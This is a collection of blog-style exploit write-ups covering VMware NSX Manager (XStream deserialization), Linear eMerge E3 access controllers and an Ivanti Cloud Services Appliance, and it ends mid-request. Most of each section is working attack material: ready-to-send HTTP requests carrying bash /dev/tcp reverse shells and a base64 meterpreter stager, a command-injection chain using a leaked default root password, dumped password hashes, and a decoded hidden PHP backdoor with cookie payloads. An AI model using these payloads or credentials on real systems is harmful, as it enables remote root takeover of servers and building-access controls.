I have created  Metasploit module `exploit/linux/http/flir_ax8_unauth_rce_cve_2022_37061` that will check if the device is vulnerable and launches a reverse `netcat` shell or `meterpreter` session on a vulnerable device . You can download this module from the link in the reference section below and follow the instructions to run it locally.

Pushing this module to the Metasploit mainstream is in progress.

### Mitigation
Upgrade camera version to a higher firmware version then `1.46.16`.

### References
[Packetstorm] (https://packetstormsecurity.com/files/168114/FLIX-AX8-1.46.16-Remote-Command-Execution.html)
[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit)

### Credits
Credits goes to the security researchers below who discovered these vulnerabilities.
* [Thomas Knudsen] (https://www.linkedin.com/in/thomasjknudsen)
* [Samy Younsi] (https://www.linkedin.com/in/samy-younsi)  




---

## CVE-2021-39144
*Posted 2022-11-06 · last revised 2022-11-07*

> XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

On the 25th October 2022, security researcher Sina Kheirkhah and Steven Seeley from  Source Incite discovered a remote code execution in VMware NSX Manager (NSX-V) that exploits the XStream vulnerability that was identified in August 2021. 
There is an excellent writeup that can be found here: [Eat What You Kill](https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html) which explains this technical details of this remote code execution. 
Please read the article first because I will not repeat all the good things explained in the article, but focus more on how to weaponize this exploit.

In a nut shell, XStream is a set of concise and easy-to-use open-source class libraries for marshalling Java objects into XML or unmarshalling XML into Java objects. It is a two-way converter between Java objects and XML. 
In XStream <= `1.4.18 ` there is a de-serialization of untrusted data and is tracked as CVE-2021-39144. VMWare NSX Manager (NSX-V) uses the package `xstream-1.4.18.jar` so it is vulnerable to this de-serialization vulnerability.

But this is not the only part. 

To make this work  `Dynamic Proxies` are used. 
`Dynamic proxy` is a design pattern in Java which provides a proxy for a certain object, and the proxy object controls the access to the real object.  These proxies are fronts or wrappers that pass function invocation through their own facilities (onto real methods) and this is being used to trigger the execution.

And the final piece is to identify an endpoint that is reachable from an unauthenticated context, where an attacker can send a specially crafted XStream marshalled payload with the dynamic proxy and trigger remote code execution in the context of root!
This unauthenticated  endpoint can be  found in `/home/secureall/secureall/sem/WEB-INF/spring/security-config.xml` configuration and is pre-authenticated due to the use of `isAnonymous`.

```
<http auto-config="false" use-expressions="true" entry-point-ref="authenticationEntryPoint" create-session="stateless">
        <csrf disabled="true" />
        <!-- ... -->
        <intercept-url pattern="/api/2.0/services/usermgmt/password/**" access="isAnonymous()" />
        <intercept-url pattern="/api/2.0/services/usermgmt/passwordhint/**" access="isAnonymous()" />
        <!-- ... -->
        <custom-filter position="BASIC_AUTH_FILTER" ref="basicSSOAuthNFilter"/>
        <custom-filter position="PRE_AUTH_FILTER" ref="preAuthFilter"/>
        <custom-filter after="SECURITY_CONTEXT_FILTER" ref="jwtAuthFilter"/>
        <custom-filter before="BASIC_AUTH_FILTER" ref="unamePasswordAuthFilter"/>
    </http>
```

So far, so good, but how do we weaponize this to achieve the remote code execution?

At first, take this XML example below to craft your malicious XML payload.
```
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>PUT YOUR PAYLOAD HERE</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```
Let's take a reverse bash shell payload example: `bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1`  and send this with `burpsuite` to the pre-authenticated endpoint of a vulnerable VMware NSX Manager. The pre-authenticated endpoint will work with any randomized string `/api/2.0/services/usermgmt/password/<random string>`.

**Note:** please use HTML encoding for your payload inside the XML, otherwise it will NOT work.

**Burp Request**
```
PUT /api/2.0/services/usermgmt/password/blablabla HTTP/1.1
Host: 192.168.100.5
Content-Type: application/xml
Content-Length: 587

<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>bash</string>
                    <string>-c</string>
                    <string>bash -i &#x3e;&#x26; /dev/tcp/192.168.100.7/4444 0&#x3e;&#x26;1</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```
Start a Netcat listener on attacker host and send the burp request to the vulnerable endpoint.
You will get a `bash` shell on your attacker machine.
```
# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.100.7] from (UNKNOWN) [192.168.100.5] 46488
bash: cannot set terminal process group (5722): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0# uname -a
uname -a
Linux manager 4.9.297 #1 SMP Tue Feb 1 08:50:25 GMT 2022 x86_64 GNU/Linux
bash-5.0# whoami
whoami
root
bash-5.0# 
```
Let's take another example where we launch a meterpreter session using `Metasploit`.
First create a python meterpreter payload using `mfsvenom`.
```
# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.100.7 LPORT=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 497 bytes
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTAwLjcnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))
```
Encode this payload with an HTML encoder. There are a lot of good HTML encoders online that you can use -> [Online HTML encoder](https://emn178.github.io/online-tools/html_encode.html)
And construct the XML payload below with `burpsuite`.
```
PUT /api/2.0/services/usermgmt/password/cuckoo HTTP/1.1
Host: 192.168.100.5
Content-Type: application/xml
Content-Length: 1055

<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>python</string>
                    <string>-c</string>
                    <string>exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTAwLjcnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=&#39;)[0]))</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
``` 
Start up a python meterpreter listener in `Metasploit` using the `multi/handler`.
```
msf6 > use multi/handler
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4444
```
Send the burp request and wait for meterpreter session to come in.
```
msf6 exploit(multi/handler) > [*] Sending stage (40164 bytes) to 192.168.100.5
[*] Sending stage (40168 bytes) to 192.168.100.5
[*] Meterpreter session 5 opened (192.168.100.7:4444 -> 192.168.100.5:58920) at 2022-11-06 06:47:59 +0000

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                      Information     Connection
  --  ----  ----                      -----------     ----------
  5         meterpreter python/linux  root @ manager  192.168.100.7:4444 -> 192.168.100.5:58920 (192.168.100.5)

msf6 exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > sysinfo
Computer        : manager
OS              : Linux 4.9.297 #1 SMP Tue Feb 1 08:50:25 GMT 2022
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > getuid
Server username: root
meterpreter >
```
The examples above show that it is pretty simple to weaponize and therefore there is a high probability of exploitation in the wild.
`VMware Cloud Foundation 3.x` and more specific `NSX Manager Data Center for vSphere` up to and including version ` 6.4.13` are vulnerable to Remote Command Injection using XStream.

I have created a  Metasploit module that has been submitted to the mainstream for production.  A local version of this module can found at the Reference section.

## Mitigation
Please update `VMware NSX Manager` to `6.4.14` and follow the instructions in VMware Knowledge Base article listed in the Reference section.

## References
[Eat What You Kill::Pre-authenticated Remote Code Execution in VMWare NSX Manager](https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html) 
[VMware advisory] (https://www.vmware.com/security/advisories/VMSA-2022-0027.html)
[VMware KB] (https://kb.vmware.com/s/article/89809)
[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)

### Credits
Credits goes to the security researchers below who discovered these vulnerabilities.
* [Sina Kheirkhah](https://twitter.com/SinSinology)
* [Steven Seeley](https://twitter.com/steventseeley)



---

## CVE-2019-7256
*Posted 2022-12-03 · last revised 2022-12-11*

> Linear eMerge E3-Series devices allow Command Injections.

Building Automation and Access Control systems are at the heart of many critical infrastructures, and their security is vital. Executing attacks on these systems may enable unauthenticated attackers to access and manipulate doors, elevators, air-conditioning systems, cameras, boilers, lights, safety alarm systems in an entire building - potentially causing physical damage, introducing safety risks or financial repercussions. 

In one of the recent security engagements,  we stumbled across a Nortek Linear eMerge E3 Access Controller managing all the building and camera access. It was exposed to the Internet for remote management on port 80 and we soon figured out that it was vulnerable.

And guess what, these vulnerabilities were already discovered in 2019 by `Gjoko Krstic` a.k.a `LiquidWorm` from Applied Risk. He published a paper [AR2019005] (https://applied-risk.com/resources/ar-2019-005) that demonstrated a raft of critical vulnerabilities that exists on these Building Access Control Systems. 
`Nortek Security & Control, LLC (NSC)` , the manufacturer of these Access Controls Systems is a leader in wireless security, home automation and personal safety systems and devices.
They claim that the eMerge E3-Series embedded browser-based network appliance platform makes `advanced security` technology `reliable` and affordable for any entry-level access control application.

Well, forget the words `advanced security` and `reliable` because it is pretty tragic to see that the majority of these Linear eMerge E3 access controllers (around **3500** listed in `Shodan`) are still vulnerable in 2022 and impose a huge security risk on the organizations using these devices for their physical and logical security.

Recently  `Nice`, a global manufacturer of smart home, security and building automation solutions, announced the acquisition of Nortek and let's hope that this will improve the quality of their security products.

Now let's demonstrate on how vulnerable this platform is and bare in mind that this platform is responsible for building and camera access and therefore a prime target for malicious actors.

Within the Linear eMerge E3 access controller, several endpoints are vulnerable to a remote command injection (RCE).
* http://<HOST:PORT>/card_scan_decoder.php?No=30&door=%60<CMD>%60
* http://<HOST:PORT>/card_scan.php?No=30&ReaderNo=%60<CMD>%60
* http://<HOST:PORT>/card_scan.php?No=1337&ReaderNo=%60<CMD>%60&CardFormatNo=1337

You can easily demonstrate this with `burpsuite` crafting a request, using the `sleep` command or create a test file with the command `whoami > cuckoo.txt` which then can be access through the web interface.

**Burp request**
```
GET /card_scan_decoder.php?No=30&door=%60sleep+10%60 HTTP/1.1
Host: <IP HOST>
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```
**Response** which will take around 10 seconds...
```
HTTP/1.1 200 OK
X-Powered-By: PHP/5.5.23
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Sat, 03 Dec 2022 04:53:22 GMT
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Content-type: text/html; charset=utf-8
Connection: close
Date: Sat, 03 Dec 2022 04:53:32 GMT
Server: lighttpd/1.4.22
Content-Length: 67

{"raw":false,"card_format_default":"","total_bit":null,"data":null}
```
Example with `whoami` command

**Burp request**
```
GET /card_scan_decoder.php?No=30&door=%60whoami+>cuckoo.txt%60 HTTP/1.1
Host: <IP HOST>
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```
**Get cuckoo.txt**
```
GET /cuckoo.txt HTTP/1.1
Host: <IP HOST>
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```
**Response**
```
HTTP/1.1 200 OK
Content-Type: text/plain
Accept-Ranges: bytes
ETag: "2943015055"
Last-Modified: Sat, 03 Dec 2022 05:02:15 GMT
Content-Length: 9
Connection: close
Date: Sat, 03 Dec 2022 05:07:06 GMT
Server: lighttpd/1.4.22

lighttpd
```
This is already pretty interesting for malicious actors to pursue, but there is more to it.
The `lighttpd` user is restricted to execute certain commands due a restricted `busybox` implementation, so it is difficult to get a real reverse shell or meterpreter session established which gives full control on the server.

Well, do not worry, our Nortek friends also decided to implement a default root password on the access controller which easily can be picked from `etc/password`. 
Yes,  you red  it right, `/etc/password` with read rights for the world instead of using `/etc/shadow` (see my analysis on [CVE-2019-7252](https://attackerkb.com/topics/v1NMUqh8F2/cve-2019-7252) for more info).
This password has already been hacked in 2019 and can be used to escalate privileges and get a root shell or meterpreter session.

Let's show a quick example how we spawn a root shell...

First generate a payload with `msfvenom`
```
# msfvenom -p cmd/unix/reverse_bash LHOST=<ATTACKER> LPORT=<PORT> -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 77 bytes
bash -c '0<&74-;exec 74<>/dev/tcp/<ATTACKER>/<PORT>;sh <&74 >&74 2>&74'
```
Next step is to create the payload using the default root password `davestyle`
**payload:** `echo davestyle | su -c "bash -c '0<&74-;exec 74<>/dev/tcp/<ATTACKER>/<PORT>;sh <&74 >&74 2>&74'"`

Apply URL encoding to make it work in your burp request and start a `multi/handler` with the reverse_bash payload , <ATTACKER> and <PORT> settings in `msf`.
**URL encode payload:** `%60echo+davestyle+%7C+su+-c+%22bash+-c+%270%3C%2674-%3Bexec+74%3C%3E%2Fdev%2Ftcp%2F<ATTACKER>%2F<PORT>%3Bsh+%3C%2674+%3E%2674+2%3E%2674%27%22%60`

**Burp request**
```
GET /card_scan_decoder.php?No=30&door=%60echo+davestyle+%7C+su+-c+%22bash+-c+%270%3C%2674-%3Bexec+74%3C%3E%2Fdev%2Ftcp%2F<ATTACKER>%2F<PORT>%3Bsh+%3C%2674+%3E%2674+2%3E%2674%27%22%60 HTTP/1.1
Host: <IP HOST>
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```
**Metasploit handler**
```
msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on <ATTACKER>:<PORT>
msf6 exploit(multi/handler) > [*] Command shell session 1 opened (127.0.0.1:<PORT> -> 127.0.0.1:48944) at 2022-12-03 11:42:27 +0000

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

whoami
root
ls -l /etc/passwd
-rwxr--r--    1 e3user   linear         733 Nov 13  2012 /etc/passwd
cat /etc/passwd
root:$1$VVtYRWvv$gyIQsOnvSv53KQwzEfZpJ0:0:100:root:/root:/bin/sh
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/adm:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:
news:x:9:13:news:/var/spool/news:
uucp:x:10:14:uucp:/var/spool/uucp:
operator:x:11:0:operator:/root:
games:x:12:100:games:/usr/games:
gopher:x:13:30:gopher:/usr/lib/gopher-data:
ftp:x:14:50:FTP User:/home/ftp:
nobody:x:99:99:Nobody:/home/default:
e3user:$1$vR6H2PUd$52r03jiYrM6m5Bff03yT0/:1000:1000:Linux User,,,:/home/e3user:/bin/sh
lighttpd:$1$vqbixaUx$id5O6Pnoi5/fXQzE484CP1:1001:1000:Linux User,,,:/home/lighttpd:/bin/sh
```

The example above show that it is pretty simple to weaponize and therefore there is a high probability of exploitation in the wild.
I have created a Metasploit module that has been submitted to the Metasploit mainstream.

## Mitigation
Please update your Linear eMerge E3 access controller to a higher version then  `1.00-06`.

## References
[Nortek Linear eMerge E3-Series 1.00-06 Multiple Vulnerabilities](https://applied-risk.com/resources/ar-2019-005)
[Packet storm](https://packetstormsecurity.com/files/155256/Linear-eMerge-E3-1.00-06-card_scan_decoder.php-Command-Injection.html)
[Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17312)

## Credits
Credits goes to the security researcher below who discovered these vulnerabilities.
[Gjoko 'LiquidWorm' Krstic](gjoko@applied-risk.com)

 

---

## CVE-2019-7252
*Posted 2022-12-03 · last revised 2022-12-11*

> Linear eMerge E3-Series devices have Default Credentials.

In my article [cve-2019-7256](https://attackerkb.com/topics/8WUJkci8N4/cve-2019-7256) at attackerkb.com, I already elaborated on the security risks and vulnerabilities that still exists on the Linear eMerge E3 access controller. 
Beside the RCE vulnerabilities, also default credentials exist within the vulnerable configuration that can be easily leveraged to gain privileged access to the system.

There are two significant vulnerabilities:
The first one is based on a default root password that is a stored in the `/etc/passwd` and is available on the vulnerable configuration. This can be used to escalate to root privileges using the RCE vulnerability [CVE-2019-7256](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7256) or use these credentials in combination with `ssh` (if enabled) to get root access  to the access controller.
The second credential vulnerability allows an unauthenticated malicious actor to obtain the web credentials for user `admin` from the spider database that is accessible and readable for the world on the access controller. With this access, the malicious actor is able to control the Linear eMerge E3 access platform, the access to building and its cameras and the authority to manage the access rights of users.

Lets quickly demonstrate both vulnerabilities...

We assume that we have already gained access to the system using the RCE described in [CVE-2019-7256](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7256)
```
ls -l /etc/passwd
-rwxr--r--    1 e3user   linear         733 Nov 13  2012 /etc/passwd
cat /etc/passwd
root:$1$VVtYRWvv$gyIQsOnvSv53KQwzEfZpJ0:0:100:root:/root:/bin/sh
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/adm:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:
news:x:9:13:news:/var/spool/news:
uucp:x:10:14:uucp:/var/spool/uucp:
operator:x:11:0:operator:/root:
games:x:12:100:games:/usr/games:
gopher:x:13:30:gopher:/usr/lib/gopher-data:
ftp:x:14:50:FTP User:/home/ftp:
nobody:x:99:99:Nobody:/home/default:
e3user:$1$vR6H2PUd$52r03jiYrM6m5Bff03yT0/:1000:1000:Linux User,,,:/home/e3user:/bin/sh
lighttpd:$1$vqbixaUx$id5O6Pnoi5/fXQzE484CP1:1001:1000:Linux User,,,:/home/lighttpd:/bin/sh
```
AS you can see is the default root password hash stored directly in `/etc/passwd` and readable for world. Normally, these password hashes are stored in a `/etc/shadow` file that is only readable for root. With this configuration, It is very easy to retrieve the hash and run a password dictionary or brute force attack with for instance `hashcat` to retrieve the password. And do not worry, somebody did this job already in 2019 ;-) -> `davestyle`. 

To test if the root default password is available...
```
echo davestyle | su -c whoami
root
```
The second credential vulnerability can be exploited by querying the spider access controller database which has the user and password information stored in clear text.

This database resides in `/tmp/SpiderDB/Spider.db` and with the command below you can very easily retrieve the admin web credentials.
```
grep "Controller" /tmp/SpiderDB/Spider.db |cut -f 5,6 -d ',' |grep ID
ID='admin',Password='xxxxxxx'
```
And if this is not successful, you can always try the default web credential setting `admin:admin`

Another Metasploit module to test the availability of the default root password and leak the admin web credentials  has been submitted to the Metasploit mainstream.

## Mitigation
Change the default root password on your access controller.
Update your Linear eMerge E3 access controller to a higher version then  `1.00-06`.

## References
[Nortek Linear eMerge E3-Series 1.00-06 Multiple Vulnerabilities](https://applied-risk.com/resources/ar-2019-005)
[Packet storm](https://packetstormsecurity.com/files/155256/Linear-eMerge-E3-1.00-06-card_scan_decoder.php-Command-Injection.html)

## Credits
Credits goes to the security researcher below who discovered these vulnerabilities.
[Gjoko 'LiquidWorm' Krstic](gjoko@applied-risk.com)



---

## CVE-2021-44529
*Posted 2023-01-08 · last revised 2023-01-14*

> A code injection vulnerability in the Ivanti EPM Cloud Services Appliance (CSA) allows an unauthenticated user to execute arbitrary code with limited permissions (nobody).

During the boring Christmas Days,  -- those days where you have to sit together, be nice to each other and eat and drink too much --, I stumbled upon this RCE where surprisingly not much was published on the analysis of this vulnerability.
It was discovered in December 2021 by the security researcher `Jakub Kramarz` and is affecting the `Ivanti Cloud Services Appliance for Avanti Endpoint Manager` versions before `4.6.0-512`.
It allows an unauthenticated user to execute arbitrary code with limited permissions (nobody).

if you read the security advisory,  [Ivanti Security Advisory 2021-12-02](https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US), it mentions that the vulnerable code is located in the `/opt/landesk/broker/webroot/lib/csrf-magic.php` and the target endpoint is `/client/index.php`.

> To mitigate the issue, make a backup of the file and manually edit as follows: Remove the ten lines near the end of the file that start with “// Obscure Tokens” > but leave in the last 6 lines of code which follow which is the section that starts with “// Load user configuration”.

After some research on the Internet, i managed to lay my hands on a vulnerable virtual appliance and installed it in `Virtualbox`.
After searching in the file  `/opt/landesk/broker/webroot/lib/csrf-magic.php`, I indeed found the vulnerable code mentioned in the security advisory (see code snippet below)
```php
// Obscure Tokens
$aeym="RlKHfsByZWdfcmVwfsbGFjZShhcnJheSgnLfs1teXHc9fsXHNdLyfscsJy9fsccy8nfsKSwgYXJyfsYXkoJycsfsJysn";
$lviw = str_replace("m","","msmtmr_mrmemplmamcme");
$bbhj="JGMofsJGEpPjMpefsyRrPSdjMTIzJzfstlfsY2hvICc8Jy4kay4nPic7ZXfsZfshbChiYXNlNjRfZGVjb2";
$hpbk="fsJGfsM9fsJ2NvdW50fsJzfsskYfsT0kXfs0NPT0tJRTtpZihyfsZfsXNldfsCgfskYfsSkfs9fsPSdhYicgJiYg";
$rvom="KSwgam9pbihhcnfsJheV9zbGljZSgkYSwkYyfsgkYSktMyfskpfsKSkpOfs2VjaG8gJzwvJy4fskay4nPic7fQ==";
$xytu = $lviw("oc", "", "ocbocaocseoc6oc4_ocdoceoccocoocdoce");
$murp = $lviw("k","","kckrkeaktkek_kfkunkcktkikokn");
$zmto = $murp('', $xytu($lviw("fs", "", $hpbk.$bbhj.$aeym.$rvom))); $zmto();
```
Interesting, right? Because it clearly looks like some hidden code...
If you just copy this in a php file and run it you will soon understand that it dynamically generates a function that enables a cookie based RCE.
Note: `create_function()` is deprecated in PHP 8 and above
```php
<?php
// Obscure Tokens
$aeym="RlKHfsByZWdfcmVwfsbGFjZShhcnJheSgnLfs1teXHc9fsXHNdLyfscsJy9fsccy8nfsKSwgYXJyfsYXkoJycsfsJysn";
$lviw = str_replace("m","","msmtmr_mrmemplmamcme");
$bbhj="JGMofsJGEpPjMpefsyRrPSdjMTIzJzfstlfsY2hvICc8Jy4kay4nPic7ZXfsZfshbChiYXNlNjRfZGVjb2";
$hpbk="fsJGfsM9fsJ2NvdW50fsJzfsskYfsT0kXfs0NPT0tJRTtpZihyfsZfsXNldfsCgfskYfsSkfs9fsPSdhYicgJiYg";
$rvom="KSwgam9pbihhcnfsJheV9zbGljZSgkYSwkYyfsgkYSktMyfskpfsKSkpOfs2VjaG8gJzwvJy4fskay4nPic7fQ==";
$xytu = $lviw("oc", "", "ocbocaocseoc6oc4_ocdoceoccocoocdoce");
$murp = $lviw("k","","kckrkeaktkek_kfkunkcktkikokn");
$zmto = $murp('', $xytu($lviw("fs", "", $hpbk.$bbhj.$aeym.$rvom)));  // $zmto();

$hvg= $xytu($lviw("fs", "", $hpbk.$bbhj.$aeym.$rvom));
echo "$lviw\n";
echo "$xytu\n";
echo "$murp\n";
echo "$hvg\n";
echo "$zmto\n";
```
 **Output**
```console
str_replace
base64_decode
create_function
$c='count';$a=$_COOKIE;if(reset($a)=='ab' && $c($a)>3){$k='c123';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}
lambda_1
```
The code line `$c='count';$a=$_COOKIE;if(reset($a)=='ab' && $c($a)>3){$k='c123';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}` is the one with the logic.

It uses the `$_COOKIE` as the input and it checks the count of the cookie pairs which should be more then 3 and the first cookie pair value should be `ab`. If these conditions match it will use the cookie pair value matching the count - 3 containing base64 PHP code , sanitizes the base64 code (remove whitespace etc) and decodes it for execution in the `eval` function which natively executes PHP code. The result of the command execution can be found in the HTTP response between the tags `<c123></c123>`.

Some examples of Cookie headers that will work:
Example 1 (count =4) -> payload at 2nd pair:  `Cookie: hello=ab; exec=<base64 php payload>; cuckoo=; clock=;`
Example 2 (count =5) -> payload at 3th pair:  `Cookie: thisisnice=ab; skipthisone=; executethisone=<base64 php payload>; b=; c=;`
Example 3 (count =6) -> payload at 4th pair:  `Cookie: thisisnice=ab; skipthisone=; alsoskipthisone=; executethisone=<base64 php payload>; b=; c=;`

Payload should be native PHP code and `base64` encoded.

The most interesting question however is, why this is added to the code? It is a left-over from testing or more likely, a backdoor to get access to the appliances? 
I do know the answer, but if you check with `Shodan`,  you will still find more then **2000** of these appliances connected to the Internet from which around **15%** still runs this vulnerable version.

Let's play a bit with Burpsuite to see if the logic works...

**Example one - system("id");**
```
GET /client/index.php HTTP/1.1
Host: 192.168.100.41
Cookie: thisisnice=ab; skipthisone=; executethisone=c3lzdGVtKCJpZCIpOw==; b=; c=;
User-Agent: curl/7.86.0
Accept: */*
Connection: close

```
**Output**
```html
HTTP/1.1 200 OK
Set-Cookie:LDCSASESSID=ttki9kounanus8fqm19juo3am6; path=/; secure; HttpOnly
Expires:Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma:no-cache
X-Frame-Options:sameorigin
X-Content-Type-Options:nosniff
Strict-Transport-Security:max-age=31536000; includeSubDomains;  preload
X-XSS-Protection:1; mode=block
Referrer-Policy:no-referrer
Content-type:text/html
Content-Length:7161
Date:Sun, 08 Jan 2023 05:29:50 GMT

<c123>uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
</c123>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Ivanti&reg; Cloud Services Appliance
etc....
```
**Example two - php meterpreter**
```console
# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.41 LPORT=4444 -f raw | base64
```
Setup a multi/handler with payload php/meterpreter/reverse_tcp 

**Burp request**
```
GET /client/index.php HTTP/1.1
Host: 192.168.100.41
